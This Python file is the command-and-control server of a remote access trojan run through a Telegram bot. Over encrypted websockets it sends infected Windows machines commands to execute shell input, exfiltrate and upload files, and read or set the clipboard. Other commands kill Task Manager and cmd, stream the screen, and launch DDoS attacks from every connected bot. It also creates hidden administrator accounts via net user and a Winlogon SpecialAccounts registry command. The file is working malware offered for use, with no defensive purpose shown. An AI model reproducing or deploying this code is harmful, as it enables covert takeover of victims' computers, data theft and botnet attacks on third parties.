#-*- coding: utf-8 -*-
from telethon import TelegramClient , events , Button
from functions import *
from config import *
import websockets 
import os
import threading
import nest_asyncio
nest_asyncio.apply()
import asyncio
import ssl
from view import *
import base64

client = TelegramClient("main",123,"123").start(bot_token=TOKEN)
print("\t\tTelethon runned.")
connected_websockets = set()
userlocal = {}
admins = [123,123]

async def websocket_endpoint(websocket, path):
    
    global connected_websockets
    try:
        connected_websockets.add(websocket)
        while True:
            data = await websocket.recv()
            try:
                data_base64 = AES_obj.decrypt(data)
                message = json.loads(data_base64)
                ip = websocket.remote_address[0]
                if 'x-forwarded-for' in websocket.request_headers:
                    ip = websocket.request_headers['x-forwarded-for']
            except:
                await websocket.close()
            finally:
                if message['action'] == "start":
                    text = connectFrame(ip, message['info'])
                    for i in admins:
                        send_message(i, text,ip)
                elif message['action'] == "cmd":
                    edit_message("Result:\n"+message['result'],message['user_id'],message['msg_id'],ip)
                elif message['action'] == "getinfo":
                    text = GetInfoFrame(ip, message['info'])
                    edit_message(text,message['user_id'],message['msg_id'],ip)
                elif message['action'] == "savedownload":
                    data = base64.b64decode(message['data'].encode())
                    open(message['path'].split("\\")[-1],'ab').write(data)
                elif message['action'] == "enddownload":
                    send_file(message['user_id'],message['path'].split("\\")[-1])
                    os.remove(message['path'].split("\\")[-1])
                elif message['action'] == "lockinput":
                    text = "ʟᴏᴄᴋɪɴɢ ɪɴᴘᴜᴛ sᴜᴄᴄᴇssғᴜʟʟʏ ᴛᴜʀɴᴇᴅ ᴏɴ ✅"
                    edit_message(text,message['user_id'],message['msg_id'],ip)
                elif message['action'] == "unlockinput":
                    text = "ʟᴏᴄᴋɪɴɢ ɪɴᴘᴜᴛ sᴜᴄᴄᴇssғᴜʟʟʏ ᴛᴜʀɴᴇᴅ ᴏғғ ✅"
                    edit_message(text,message['user_id'],message['msg_id'],ip)
                elif message['action'] == "getclipboard":
                    text = "ᴄʟɪᴘʙᴏᴀʀᴅ ᴅᴀᴛᴀ: `" + message['data']+"`"
                    edit_message(text,message['user_id'],message['msg_id'],ip)
                
                elif message['action'] == "setclipboard":
                    text = "ᴄʟɪᴘʙᴏᴀʀᴅ sᴇᴛᴇᴅ sᴜᴄᴄᴇssғᴜʟʟʏ✅"
                    edit_message(text,message['user_id'],message['msg_id'],ip)
                elif message['action'] == "ddos":
                    text = "ᴅᴅᴏs sᴇɴᴛ ᴛᴏ ᴛᴀʀɢᴇᴛ 🔥 ᴇɴᴊᴏʏ."
                    edit_message(text,message['user_id'],message['msg_id'],ip)
                elif message['action'] == "streamviewon":
                    text = """⚡️ ᴛᴀʀɢᴇᴛ sᴛʀᴇᴀᴍɪɴɢ ᴛᴜʀɴᴇᴅ ᴏɴ ⚡️

🔥ʏᴏᴜ ᴄᴀɴ ᴡᴀᴛᴄʜ ɪᴛ ʜᴇʀᴇ..."""
                    open("stream.html",'w').write(FULL_HTML_TEXT.replace("thiswillChange",ip+":5000"))
                    edit_message(text,message['user_id'],message['msg_id'],ip)
                    
                    send_file(message['user_id'],"stream.html")
                elif message['action'] == "streamviewoff":
                    text = """ᴛᴀʀɢᴇᴛ sᴛʀᴇᴀᴍɪɴɢ ᴛᴜʀɴᴇᴅ ᴏғғ ✅"""
                    edit_message(text,message['user_id'],message['msg_id'],ip)
                elif message['action'] == "tskmgrkillon":
                    text = """ᴛᴀsᴋ ᴍᴀɴᴀɢᴇʀ ᴋɪʟʟᴇʀ ᴛᴜʀɴᴇᴅ ᴏɴ ✅"""
                    edit_message(text,message['user_id'],message['msg_id'],ip)
                
                elif message['action'] == "tskmgrkilloff":
                    text = """ᴛᴀsᴋ ᴍᴀɴᴀɢᴇʀ ᴋɪʟʟᴇʀ ᴛᴜʀɴᴇᴅ ᴏғғ ❌"""
                    edit_message(text,message['user_id'],message['msg_id'],ip)
                
                elif message['action'] == "cmdkillon":
                    text = """Cᴍᴅ ᴋɪʟʟᴇʀ ᴛᴜʀɴᴇᴅ ᴏɴ ✅"""
                    edit_message(text,message['user_id'],message['msg_id'],ip)
                
                elif message['action'] == "cmdkillon":
                    text = """Cᴍᴅ ᴋɪʟʟᴇʀ ᴛᴜʀɴᴇᴅ ᴏғғ ❌"""
                    edit_message(text,message['user_id'],message['msg_id'],ip)

    except websockets.exceptions.ConnectionClosed:
        connected_websockets.remove(websocket)


@client.on(events.NewMessage(func=lambda x: x.sender_id in admins))
async def main(event):
    global userlocal , connected_websockets
    user_id = event.sender_id
    sender = event.sender
    chat_id = event.chat_id
    first_name = sender.first_name
    text = event.text
    try: userlocal[user_id]
    except: userlocal[user_id] = {"step":None}
    if text == "/start":
        userlocal[user_id] = {"step":None}
        await event.respond(HOME_TEXT,buttons = HOME_BUTTON)     
        
    if userlocal[user_id]['step'] == "GetCommandToShell":
        ip = userlocal[user_id]['ip']
        msg = userlocal[user_id]['msg']
        msg = await event.respond("Sᴇᴀʀᴄʜɪɴɢ ғᴏʀ ᴛᴀʀɢᴇᴛ...")
        try:
            websocket = list(filter(lambda x: x.request_headers['x-forwarded-for'] == ip,connected_websockets))[0]
            msg = await msg.edit("Exᴇᴄᴜᴛɪɴɢ...")
            await websocket.send(encode(
                {"action":"cmd","command":text,"user_id":user_id,"msg_id":msg.id}
            ))
            
        except IndexError:
            msg = await msg.edit("ᴛᴀʀɢᴇᴛ ɴᴏᴛ ғᴏᴜɴᴅ.")
    
    elif userlocal[user_id]['step'] == "GetPathToDownload":
        ip = userlocal[user_id]['ip']
        msg = userlocal[user_id]['msg']
        msg = await event.respond("Sᴇᴀʀᴄʜɪɴɢ ғᴏʀ ᴛᴀʀɢᴇᴛ...")
        try:
            websocket = list(filter(lambda x: x.request_headers['x-forwarded-for'] == ip,connected_websockets))[0]
            await msg.edit("ᴅᴏᴡɴʟᴏᴀᴅɪɴɢ...")
            await websocket.send(encode({"action":"download","path":text,"user_id":user_id}))
        except IndexError:
            msg = await msg.edit("ᴛᴀʀɢᴇᴛ ɴᴏᴛ ғᴏᴜɴᴅ.")

    elif userlocal[user_id]['step'] == "GetFileToUplaod":

        await event.respond("ᴇɴᴛᴇʀ ᴘᴀᴛʜ ʏᴏᴜ ᴡᴀɴᴛ ᴛᴏ ᴜᴘʟᴏᴀᴅ ғɪʟᴇ:")
        userlocal[user_id]['step'] = "GetFileToUplaodPath"
        userlocal[user_id]['msg_dn'] = event.message

    elif userlocal[user_id]['step'] == "GetFileToUplaodPath":
        msgg = userlocal[user_id]['msg_dn']
        msg = await event.respond("ᴅᴏᴡɴʟᴏᴀᴅɪɴɢ...")
        download = await client.download_media(msgg)
        if text[-1] != "\\":
            text += "\\"
        msg = await msg.edit("ᴅᴏᴡɴʟᴏᴀᴅ ᴄᴏᴍᴘʟᴇᴛᴇᴅ.")
        msg = await event.respond("ᴜᴘʟᴏᴀᴅɪɴɢ ғᴏʀ ᴛᴀʀɢᴇᴛ.")
        await event.respond(TG_CONTROL_TEXT,buttons=getControl(ip))
        ip = userlocal[user_id]['ip']
        websocket = list(filter(lambda x: x.request_headers['x-forwarded-for'] == ip,connected_websockets))[0]
        with open(download, 'rb') as f:
            data = f.read(8192)
            while data:
                await websocket.send(encode(
                    {"action": "upload", "data": base64.b64encode(data).decode(), "path": text + download}
                ))
                data = f.read(8192)
            os.remove(download)
        
    elif userlocal[user_id]['step'] == "SetClipboard":
        ip = userlocal[user_id]['ip']
        msg = await event.respond("Sᴇᴀʀᴄʜɪɴɢ ғᴏʀ ᴛᴀʀɢᴇᴛ...")
        try:
            websocket = list(filter(lambda x: x.request_headers['x-forwarded-for'] == ip,connected_websockets))[0]
            await websocket.send(encode(
                {"action":"setclipboard","data":text,"user_id":user_id,"msg_id":msg.id}
            ))
            
        except IndexError:
            msg = await msg.edit("ᴛᴀʀɢᴇᴛ ɴᴏᴛ ғᴏᴜɴᴅ.",buttons=BACK_BUTTON)

    elif userlocal[user_id]['step'] == "ddos":
        ip = userlocal[user_id]['ip']
        msg = await event.respond("Sᴇᴀʀᴄʜɪɴɢ ғᴏʀ ᴛᴀʀɢᴇᴛ...")
        try:
            url ,tim , thread = text.split(" ")
            websocket = list(filter(lambda x: x.request_headers['x-forwarded-for'] == ip,connected_websockets))[0]
            await websocket.send(encode(
                {"action":"ddos","time":int(tim),"thread":int(thread),"url":url,"user_id":user_id,"msg_id":msg.id}
            ))
            
        except IndexError:
            msg = await msg.edit("ᴛᴀʀɢᴇᴛ ɴᴏᴛ ғᴏᴜɴᴅ.",buttons=BACK_BUTTON)
    
    elif userlocal[user_id]['step'] == "ddoswithall":
        msg = await event.respond("Sᴇᴀʀᴄʜɪɴɢ ғᴏʀ ᴛᴀʀɢᴇᴛ...")
        try:
            url ,tim , thread = text.split(" ")
            for ws in connected_websockets:
                await ws.send(encode(
                    {"action":"ddos","time":int(tim),"thread":int(thread),"url":url,"user_id":user_id,"msg_id":msg.id}
                ))
            
            text = "ᴅᴅᴏs sᴇɴᴛ ᴛᴏ ᴛᴀʀɢᴇᴛ 🔥 ᴇɴᴊᴏʏ."
            await msg.edit(text)
        except IndexError:
            msg = await msg.edit("ᴛᴀʀɢᴇᴛ ɴᴏᴛ ғᴏᴜɴᴅ.",buttons=BACK_BUTTON)
    
    elif userlocal[user_id]['step'] == "GetUserToDelete":
        msg = await event.respond("Sᴇᴀʀᴄʜɪɴɢ ғᴏʀ ᴛᴀʀɢᴇᴛ...")
        try:
            com = f"net user {text} /active:yes && net user {text} /delete"
            for ws in connected_websockets:
                await ws.send(encode(
                    {"action":"cmd","command":com,"user_id":user_id,"msg_id":msg.id}
                ))

        except IndexError:
            msg = await msg.edit("ᴛᴀʀɢᴇᴛ ɴᴏᴛ ғᴏᴜɴᴅ.",buttons=BACK_BUTTON)
    
    elif userlocal[user_id]['step'] == "GetUserToAdd":
        msg = await event.respond("Sᴇᴀʀᴄʜɪɴɢ ғᴏʀ ᴛᴀʀɢᴇᴛ...")
        try:
            user,passw = text.split(" ")
            com = f"net user {user} {passw} /add && net localgroup administrators {user} /add && reg add \"HKLM\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\Userlist\" /v {user} /t REG_DWORD /d 0" 
            for ws in connected_websockets:
                await ws.send(encode(
                    {"action":"cmd","command":com,"user_id":user_id,"msg_id":msg.id}
                ))
        except IndexError:
            msg = await msg.edit("ᴛᴀʀɢᴇᴛ ɴᴏᴛ ғᴏᴜɴᴅ.",buttons=BACK_BUTTON)
    
@client.on(events.CallbackQuery(func=lambda x: x.sender_id in admins))
async def startMenu(event):
    global userlocal , connected_websockets
    user_id = event.sender_id
    sender = event.sender
    chat_id = event.chat_id
    data = event.data.decode()
    first_name = sender.first_name
    try: userlocal[user_id]
    except: userlocal[user_id] = {"step":None}
    if data == "GetOnlineRequest":
        ipsss = [ ws.request_headers['x-forwarded-for'] for ws in connected_websockets]
        ipsss = set(ipsss)
        all_ips = [ Button.inline(ip,"tgip-"+ip) for ip in ipsss]
        small_lists = [all_ips[i:i+2] for i in range(0, len(all_ips), 2)]
        small_lists.append(BACK_BUTTON)
        await event.edit(LIST_TEXT,buttons = small_lists)
    elif data == "back":
        userlocal[user_id] = {"step":None}
        await event.edit(HOME_TEXT,buttons = HOME_BUTTON)
    elif "tgip" == data.split("-")[0]:
        userlocal[user_id] = {"step":None}
        ip = data.split("-")[1]
        await event.edit(TG_CONTROL_TEXT,buttons=getControl(ip))
    elif "shellexec"  == data.split("-")[0]:
        userlocal[user_id] = {"step":None}
        ip = data.split("-")[1]
        a1 = await event.edit("ᴇɴᴛᴇʀ ᴄᴏᴍᴍᴀɴᴅ ᴛᴏ ᴇxᴇᴄᴜᴛᴇ ᴏɴ ᴛᴀʀɢᴇᴛ sʏsᴛᴇᴍ:",buttons = Button.clear())
        userlocal[user_id]['step'] = "GetCommandToShell"
        userlocal[user_id]['ip'] = ip
        userlocal[user_id]['msg'] = a1
    elif "tginforeq" == data.split("-")[0]:
        userlocal[user_id] = {"step":None}
        msg = await event.edit("Sᴇᴀʀᴄʜɪɴɢ ғᴏʀ ᴛᴀʀɢᴇᴛ...",buttons=BACK_BUTTON)
        ip = data.split("-")[1]
        try:
            websocket = list(filter(lambda x: x.request_headers['x-forwarded-for'] == ip,connected_websockets))[0]
            await websocket.send(encode(
                {"action":"getinfo","user_id":user_id,"msg_id":msg.id}
            ))
        except IndexError:
            msg = await msg.edit("ᴛᴀʀɢᴇᴛ ɴᴏᴛ ғᴏᴜɴᴅ.")
    
    elif "download" == data.split("-")[0]:
        userlocal[user_id] = {"step":None}
        ip = data.split("-")[1]
        a1 = await event.edit("ᴇɴᴛᴇʀ ғɪʟᴇ ᴘᴀᴛʜ ᴛᴏ ᴅᴏᴡɴʟᴏᴀᴅ:",buttons = Button.clear())
        userlocal[user_id]['step'] = "GetPathToDownload"
        userlocal[user_id]['ip'] = ip
        userlocal[user_id]['msg'] = a1
    
    elif "upload" == data.split("-")[0]:
        userlocal[user_id] = {"step":None}
        ip = data.split("-")[1]
        a1 = await event.edit("sᴇɴᴅ ғɪʟᴇ ᴛᴏ ᴜᴘʟᴏᴀᴅ:",buttons = Button.clear())
        userlocal[user_id]['step'] = "GetFileToUplaod"
        userlocal[user_id]['ip'] = ip
        userlocal[user_id]['msg'] = a1
    elif "lockinput" == data.split("-")[0]:
        ip = data.split("-")[1]
        msg = await event.edit("Sᴇᴀʀᴄʜɪɴɢ ғᴏʀ ᴛᴀʀɢᴇᴛ...")
        try:
            websocket = list(filter(lambda x: x.request_headers['x-forwarded-for'] == ip,connected_websockets))[0]
            await websocket.send(encode(
                {"action":"lockinput","user_id":user_id,"msg_id":msg.id}
            ))
            
        except IndexError:
            msg = await msg.edit("ᴛᴀʀɢᴇᴛ ɴᴏᴛ ғᴏᴜɴᴅ.",buttons=BACK_BUTTON)

    elif "unlockinput" == data.split("-")[0]:
        ip = data.split("-")[1]
        msg = await event.edit("Sᴇᴀʀᴄʜɪɴɢ ғᴏʀ ᴛᴀʀɢᴇᴛ...")
        try:
            websocket = list(filter(lambda x: x.request_headers['x-forwarded-for'] == ip,connected_websockets))[0]
            await websocket.send(encode(
                {"action":"unlockinput","user_id":user_id,"msg_id":msg.id}
            ))
            
        except IndexError:
            msg = await msg.edit("ᴛᴀʀɢᴇᴛ ɴᴏᴛ ғᴏᴜɴᴅ.",buttons=BACK_BUTTON)

    elif "getclipboardreq" == data.split("-")[0]:
        ip = data.split("-")[1]
        msg = await event.edit("Sᴇᴀʀᴄʜɪɴɢ ғᴏʀ ᴛᴀʀɢᴇᴛ...")
        try:
            websocket = list(filter(lambda x: x.request_headers['x-forwarded-for'] == ip,connected_websockets))[0]
            await websocket.send(encode(
                {"action":"getclipboard","user_id":user_id,"msg_id":msg.id}
            ))
            
        except IndexError:
            msg = await msg.edit("ᴛᴀʀɢᴇᴛ ɴᴏᴛ ғᴏᴜɴᴅ.",buttons=BACK_BUTTON)

    elif "setclipboard" == data.split("-")[0]:
        ip = data.split("-")[1]
        await event.edit("ᴇɴᴛᴇʀ ᴛᴇxᴛ ᴛᴏ sᴇᴛ ᴏɴ ᴄʟɪᴘʙᴏᴀʀᴅ:",buttons=BACK_BUTTON)
        userlocal[user_id]['step'] = "SetClipboard"
        userlocal[user_id]['ip'] = ip
    
    elif "ddos" == data.split("-")[0]:
        ip = data.split("-")[1]
        await event.edit(DDOS_TEXT,buttons=BACK_BUTTON)
        userlocal[user_id]['step'] = "ddos"
        userlocal[user_id]['ip'] = ip
        
    elif "ddoswithall" == data:
        await event.edit(DDOS_TEXT,buttons=BACK_BUTTON)
        userlocal[user_id]['step'] = "ddoswithall"

    elif "selfdestroy" == data.split("-")[0]:
        ip = data.split("-")[1]
        msg = await event.edit("Sᴇᴀʀᴄʜɪɴɢ ғᴏʀ ᴛᴀʀɢᴇᴛ...")
        websocket = list(filter(lambda x: x.request_headers['x-forwarded-for'] == ip,connected_websockets))[0]
        await websocket.send(encode(
            {"action":"selfdestroy","user_id":user_id,"msg_id":msg.id}
        ))
        await event.edit(RAT_DESTROYED,buttons=BACK_BUTTON)

    elif "stramtgon" == data.split("-")[0]:
        ip = data.split("-")[1]
        msg = await event.edit("Sᴇᴀʀᴄʜɪɴɢ ғᴏʀ ᴛᴀʀɢᴇᴛ...")
        websocket = list(filter(lambda x: x.request_headers['x-forwarded-for'] == ip,connected_websockets))[0]
        
        try:
            websocket = list(filter(lambda x: x.request_headers['x-forwarded-for'] == ip,connected_websockets))[0]
            await websocket.send(encode(
                {"action":"streamviewon","user_id":user_id,"msg_id":msg.id}
            ))
            
        except IndexError:
            msg = await msg.edit("ᴛᴀʀɢᴇᴛ ɴᴏᴛ ғᴏᴜɴᴅ.",buttons=BACK_BUTTON)
    
    elif "stramtgoff" == data.split("-")[0]:
        ip = data.split("-")[1]
        msg = await event.edit("Sᴇᴀʀᴄʜɪɴɢ ғᴏʀ ᴛᴀʀɢᴇᴛ...")
        websocket = list(filter(lambda x: x.request_headers['x-forwarded-for'] == ip,connected_websockets))[0]
        try:
            websocket = list(filter(lambda x: x.request_headers['x-forwarded-for'] == ip,connected_websockets))[0]
            await websocket.send(encode(
                {"action":"streamviewoff","user_id":user_id,"msg_id":msg.id}
            ))
            
        except IndexError:
            msg = await msg.edit("ᴛᴀʀɢᴇᴛ ɴᴏᴛ ғᴏᴜɴᴅ.",buttons=BACK_BUTTON)
    elif "cmdkillon" == data.split("-")[0]:
        ip = data.split("-")[1]
        msg = await event.edit("Sᴇᴀʀᴄʜɪɴɢ ғᴏʀ ᴛᴀʀɢᴇᴛ...")
        websocket = list(filter(lambda x: x.remote_address[0] == ip,connected_websockets))[0]
        try:
            websocket = list(filter(lambda x: x.remote_address[0] == ip,connected_websockets))[0]
            await websocket.send(encode(
                {"action":"cmdkillon","user_id":user_id,"msg_id":msg.id}
            ))
            
        except IndexError:
            msg = await msg.edit("ᴛᴀʀɢᴇᴛ ɴᴏᴛ ғᴏᴜɴᴅ.",buttons=BACK_BUTTON)

    elif "cmdkilloff" == data.split("-")[0]:
        ip = data.split("-")[1]
        msg = await event.edit("Sᴇᴀʀᴄʜɪɴɢ ғᴏʀ ᴛᴀʀɢᴇᴛ...")
        websocket = list(filter(lambda x: x.remote_address[0] == ip,connected_websockets))[0]
        try:
            websocket = list(filter(lambda x: x.remote_address[0] == ip,connected_websockets))[0]
            await websocket.send(encode(
                {"action":"cmdkilloff","user_id":user_id,"msg_id":msg.id}
            ))
            
        except IndexError:
            msg = await msg.edit("ᴛᴀʀɢᴇᴛ ɴᴏᴛ ғᴏᴜɴᴅ.",buttons=BACK_BUTTON)

    elif "tskmgrkilloff" == data.split("-")[0]:
        ip = data.split("-")[1]
        msg = await event.edit("Sᴇᴀʀᴄʜɪɴɢ ғᴏʀ ᴛᴀʀɢᴇᴛ...")
        websocket = list(filter(lambda x: x.remote_address[0] == ip,connected_websockets))[0]
        try:
            websocket = list(filter(lambda x: x.remote_address[0] == ip,connected_websockets))[0]
            await websocket.send(encode(
                {"action":"tskmgrkilloff","user_id":user_id,"msg_id":msg.id}
            ))
            
        except IndexError:
            msg = await msg.edit("ᴛᴀʀɢᴇᴛ ɴᴏᴛ ғᴏᴜɴᴅ.",buttons=BACK_BUTTON)

    elif "tskmgrkillon" == data.split("-")[0]:
        ip = data.split("-")[1]
        msg = await event.edit("Sᴇᴀʀᴄʜɪɴɢ ғᴏʀ ᴛᴀʀɢᴇᴛ...")
        websocket = list(filter(lambda x: x.remote_address[0] == ip,connected_websockets))[0]
        try:
            websocket = list(filter(lambda x: x.remote_address[0] == ip,connected_websockets))[0]
            await websocket.send(encode(
                {"action":"tskmgrkillon","user_id":user_id,"msg_id":msg.id}
            ))
            
        except IndexError:
            msg = await msg.edit("ᴛᴀʀɢᴇᴛ ɴᴏᴛ ғᴏᴜɴᴅ.",buttons=BACK_BUTTON)
            
    elif "deleteuser" == data.split("-")[0]:
        ip = data.split("-")[1]
        await event.edit("📛 ᴇɴᴛᴇʀ ᴜsᴇʀ ᴛᴏ ᴅᴇʟᴇᴛᴇ :",buttons=BACK_BUTTON)
        userlocal[user_id]['step'] = "GetUserToDelete"
        userlocal[user_id]['ip'] = ip
    
    elif "addfulluser" == data.split("-")[0]:
        ip = data.split("-")[1]
        await event.edit(ADD_USER,buttons=BACK_BUTTON)
        userlocal[user_id]['step'] = "GetUserToAdd"
        userlocal[user_id]['ip'] = ip
    
async def mainll():
    ssl_context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    ssl_context.load_cert_chain(certfile=ssl_certfile, keyfile=ssl_keyfile)
    async with websockets.serve(websocket_endpoint, HOST, PORT, ssl=ssl_context):
        await asyncio.Future()  # run forever

def start_mainll():
    print(f"\t\tRunning Webscoket on port {PORT}.")
    asyncio.run(mainll())

if __name__ == "__main__":
    thread = threading.Thread(target=start_mainll)
    thread.start()
    client.run_until_disconnected()

